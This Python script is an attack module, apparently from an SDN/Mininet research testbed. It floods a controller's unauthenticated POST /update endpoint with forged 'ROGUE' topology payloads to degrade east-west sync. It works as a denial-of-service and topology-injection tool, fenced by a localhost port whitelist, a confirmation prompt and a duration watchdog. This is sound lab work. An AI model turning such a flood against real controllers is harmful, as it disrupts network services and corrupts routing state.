#!/usr/bin/env python3
"""
attacks/eastwest_flood.py
--------------------------
Phase 5 — Attack Module 2: East-West REST API Flood (Novel)

Strategy
────────
A malicious peer controller (or compromised process) hammers the victim
controller's POST /update endpoint with high-rate valid-looking JSON
payloads.  Because /update is unauthenticated and immediately merges the
payload into global_topology, every request triggers internal locking,
JSON parsing, and topology-merge code paths — degrading the controller's
ability to process LEGITIMATE peer sync messages and making EW convergence
time measurably worse.

This is strictly a localhost / Mininet-internal attack:
  - Allowed targets: 127.0.0.1 on ports 8080, 8081, 8082 only
  - Never sends to any real external address

Safety harness
──────────────
  1. validate_target()     — checks target IP is inside ALLOWED_SUBNET OR
                              explicitly 127.0.0.1 (special-cased here because
                              the EW REST API binds to localhost)
  2. confirm_before_run()  — interactive yes/no gate
  3. safe_rate_ramp()      — gradual rate ramp
  4. start_watchdog()      — hard duration cap

Run example:
    python3 attacks/eastwest_flood.py \
        --target-port 8080 \
        --max-rate 200 \
        --duration 60
"""

from __future__ import annotations

import argparse
import logging
import os
import sys
import threading
import time
from datetime import datetime, timezone

import requests

# ── Project path ──────────────────────────────────────────────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from attacks.safety import (
    confirm_before_run,
    safe_rate_ramp,
    start_watchdog,
    UnsafeTargetError,
)

# ── Known controller REST ports — ONLY these are allowed ─────────────────────
KNOWN_EW_PORTS: dict[str, int] = {"A": 8080, "B": 8081, "C": 8082}
_ALLOWED_PORTS = set(KNOWN_EW_PORTS.values())
_EW_HOST       = "127.0.0.1"   # controllers bind to localhost only

# ── Logging ───────────────────────────────────────────────────────────────────
RESULTS_DIR = os.path.join(_ROOT, "results")
os.makedirs(RESULTS_DIR, exist_ok=True)

_ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
LOG_FILE = os.path.join(RESULTS_DIR, f"attack_eastwest_{_ts}.log")

_fmt = logging.Formatter(
    "%(asctime)s  %(levelname)-8s  %(message)s", datefmt="%Y-%m-%dT%H:%M:%S"
)
_fh = logging.FileHandler(LOG_FILE, mode="w", encoding="utf-8")
_sh = logging.StreamHandler(sys.stdout)
for _h in (_fh, _sh):
    _h.setFormatter(_fmt)

log = logging.getLogger("eastwest_flood")
log.setLevel(logging.DEBUG)
log.propagate = False
log.addHandler(_fh)
log.addHandler(_sh)

# ── Attack defaults ───────────────────────────────────────────────────────────
DEFAULT_TARGET_PORT = 8080    # Domain-A REST API
DEFAULT_START_RATE  = 10      # req/s
DEFAULT_MAX_RATE    = 200     # req/s
DEFAULT_STEP        = 20      # req/s per ramp step
DEFAULT_RAMP_INTER  = 8.0     # seconds between steps
DEFAULT_DURATION    = 60      # seconds (max 600 via watchdog)


# ── Crafted payload factory ───────────────────────────────────────────────────

def _make_payload(seq: int) -> dict:
    """
    Craft a valid-looking EW /update topology payload.
    Simulates a rogue peer controller flooding stale-but-plausible data.
    """
    import random
    return {
        "type": "topology",
        "domain_id": "ROGUE",
        "seq": seq,
        "switches": {
            str(random.randint(10, 99)): {
                "dpid": random.randint(10, 99),
                "domain": "ROGUE",
                "ports": list(range(1, random.randint(2, 6))),
            }
        },
        "links": [
            {
                "src_dpid": random.randint(1, 9),
                "src_port": random.randint(1, 4),
                "dst_dpid": random.randint(1, 9),
                "dst_port": random.randint(1, 4),
            }
        ],
        "inter_links": [],
        "hosts": {},
    }


# ── Flood worker ──────────────────────────────────────────────────────────────

class _Stats:
    """Shared counters for the flood threads."""
    def __init__(self):
        self.sent    = 0
        self.ok      = 0
        self.errors  = 0
        self.latencies: list[float] = []
        self._lock   = threading.Lock()

    def record(self, latency_ms: float, ok: bool) -> None:
        with self._lock:
            self.sent  += 1
            if ok:
                self.ok += 1
                self.latencies.append(latency_ms)
            else:
                self.errors += 1

    def summary(self) -> dict:
        with self._lock:
            lats = self.latencies or [0.0]
            return {
                "sent":       self.sent,
                "ok":         self.ok,
                "errors":     self.errors,
                "avg_lat_ms": round(sum(lats) / len(lats), 2),
                "max_lat_ms": round(max(lats), 2),
                "min_lat_ms": round(min(lats), 2),
            }


def run_ew_flood(url: str, rate: float, stop_event: threading.Event,
                 stats: _Stats) -> None:
    """Send POST /update requests at `rate` req/s until stop_event is set."""
    session  = requests.Session()
    interval = 1.0 / rate
    seq      = 0
    headers  = {
        "Content-Type":  "application/json",
        "X-Domain-Id":   "ROGUE",   # simulated malicious peer
    }
    while not stop_event.is_set():
        payload = _make_payload(seq)
        seq += 1
        t0 = time.monotonic()
        try:
            resp = session.post(url, json=payload, headers=headers, timeout=2.0)
            lat  = (time.monotonic() - t0) * 1000.0
            stats.record(lat, resp.status_code == 200)
        except Exception as exc:
            lat = (time.monotonic() - t0) * 1000.0
            log.debug("Request error (%.1fms): %s", lat, exc)
            stats.record(lat, ok=False)
        time.sleep(interval)


# ── Target validation (special-case 127.0.0.1 for EW REST) ──────────────────

def validate_ew_target(port: int) -> None:
    """
    Accept ONLY the three known controller REST ports on localhost.

    This function is the EW-specific equivalent of validate_target():
    controller REST APIs bind to 127.0.0.1 (not a Mininet host IP), so the
    generic validate_target() would reject them.  We instead enforce the
    known-port whitelist and require the host to be exactly 127.0.0.1.
    """
    if port not in _ALLOWED_PORTS:
        raise UnsafeTargetError(
            f"Refusing port {port}: only controller REST ports "
            f"{sorted(_ALLOWED_PORTS)} (127.0.0.1) are permitted.\n"
            "Targeting any other port risks hitting a real external service."
        )
    # Host is always 127.0.0.1 — no further check needed.


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "East-West REST flood — hammer a controller's POST /update endpoint "
            "to degrade legitimate EW sync performance.  Only localhost ports "
            "8080/8081/8082 are accepted."
        )
    )
    parser.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT,
                        choices=list(_ALLOWED_PORTS),
                        help="Controller REST port to flood (8080 / 8081 / 8082)")
    parser.add_argument("--start-rate",  type=int, default=DEFAULT_START_RATE,
                        help="Initial request rate (req/s)")
    parser.add_argument("--max-rate",    type=int, default=DEFAULT_MAX_RATE,
                        help="Maximum request rate (req/s)")
    parser.add_argument("--step",        type=int, default=DEFAULT_STEP,
                        help="Rate increment per ramp step (req/s)")
    parser.add_argument("--ramp-interval", type=float, default=DEFAULT_RAMP_INTER,
                        help="Seconds to hold each rate before stepping up")
    parser.add_argument("--duration",    type=int, default=DEFAULT_DURATION,
                        help="Hard upper bound on attack duration (seconds, max 600)")
    parser.add_argument("--yes",         action="store_true",
                        help="Bypass interactive confirmation")
    args = parser.parse_args()

    port     = args.target_port
    duration = args.duration
    url      = f"http://{_EW_HOST}:{port}/update"

    # ── Safety gate 1: validate target port ──────────────────────────────────
    log.info("Validating target: %s", url)
    try:
        validate_ew_target(port)
    except UnsafeTargetError as exc:
        log.error("SAFETY VIOLATION — %s", exc)
        print(f"\n[BLOCKED] {exc}", file=sys.stderr)
        return 2

    # Identify which domain we're targeting for the confirmation prompt
    domain_name = next(
        (f"Domain-{d}" for d, p in KNOWN_EW_PORTS.items() if p == port), "Unknown"
    )

    # ── Safety gate 2: interactive confirmation ───────────────────────────────
    confirmed = confirm_before_run(
        attack_name="East-West REST API Flood (Novel)",
        target=f"{url}  ({domain_name})",
        rate=f"{args.start_rate}–{args.max_rate} req/s (ramped)",
        duration=duration,
        auto_confirm=args.yes,
    )
    if not confirmed:
        log.info("User aborted. No traffic sent.")
        return 0

    # ── Safety gate 3: watchdog ───────────────────────────────────────────────
    watchdog = start_watchdog(duration)
    log.info("Watchdog armed for %d seconds.", duration)

    # ── Attack start ──────────────────────────────────────────────────────────
    stats      = _Stats()
    stop_event = threading.Event()
    start_ts   = datetime.now(timezone.utc).isoformat()

    log.info("=" * 60)
    log.info("ATTACK START  %s", start_ts)
    log.info("  Target URL      : %s", url)
    log.info("  Domain          : %s", domain_name)
    log.info("  Rate ramp       : %d → %d req/s  step=%d  interval=%.1fs",
             args.start_rate, args.max_rate, args.step, args.ramp_interval)
    log.info("  Max duration    : %d s", duration)
    log.info("  Log file        : %s", LOG_FILE)
    log.info("=" * 60)

    flood_thread = None
    try:
        for rate in safe_rate_ramp(
            start_rate=float(args.start_rate),
            max_rate=float(args.max_rate),
            step=float(args.step),
            interval=args.ramp_interval,
        ):
            log.info("RAMP STEP — %.0f req/s → %s  [sent=%d ok=%d err=%d]",
                     rate, url, stats.sent, stats.ok, stats.errors)

            if flood_thread and flood_thread.is_alive():
                stop_event.set()
                flood_thread.join(timeout=3)
                stop_event.clear()

            flood_thread = threading.Thread(
                target=run_ew_flood,
                args=(url, rate, stop_event, stats),
                daemon=True,
                name=f"ew-flood-{int(rate)}",
            )
            flood_thread.start()

        # Hold at max rate for remaining duration
        steps    = (args.max_rate - args.start_rate) // max(args.step, 1) + 1
        ramp_dur = steps * args.ramp_interval
        remaining = max(duration - ramp_dur, 0)
        if remaining > 0:
            log.info("Holding max rate %.0f req/s for %.0f more seconds.",
                     args.max_rate, remaining)
            time.sleep(remaining)

    except KeyboardInterrupt:
        log.info("Keyboard interrupt — stopping flood.")
    finally:
        stop_event.set()
        if flood_thread and flood_thread.is_alive():
            flood_thread.join(timeout=5)
        watchdog.cancel()

        stop_ts = datetime.now(timezone.utc).isoformat()
        summary = stats.summary()
        log.info("=" * 60)
        log.info("ATTACK STOP   %s", stop_ts)
        log.info("  Requests sent   : %d", summary["sent"])
        log.info("  Successful (200): %d", summary["ok"])
        log.info("  Errors          : %d", summary["errors"])
        log.info("  Avg latency     : %.2f ms", summary["avg_lat_ms"])
        log.info("  Max latency     : %.2f ms", summary["max_lat_ms"])
        log.info("  Log file        : %s", LOG_FILE)
        log.info("=" * 60)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
